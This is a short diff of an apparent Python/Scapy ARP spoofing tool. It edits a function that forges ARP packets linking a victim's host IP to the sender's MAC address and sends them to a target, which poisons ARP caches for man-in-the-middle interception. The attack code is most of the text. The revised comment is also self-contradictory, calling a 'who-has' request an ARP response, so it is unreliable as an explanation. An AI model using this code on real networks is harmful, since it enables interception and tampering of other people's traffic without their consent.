@@ -86,8 +86,7 @@ def spoof(target_ip, host_ip, my_mac):
         host_ip (string): Your ip address
     """
     
-    # craft the arp 'is-at' operation packet, in other words: an ARP response
-    # 'hwsrc' is not specified as by default it is our MAC address
+    # craft the arp 'who-has' operation packet, in other words: an ARP response
     arp_response = Ether() / ARP(op='who-has', hwsrc=my_mac, pdst=target_ip, psrc=host_ip)
     sendp(arp_response, verbose=0)
     print(".", end=" ", flush=True)
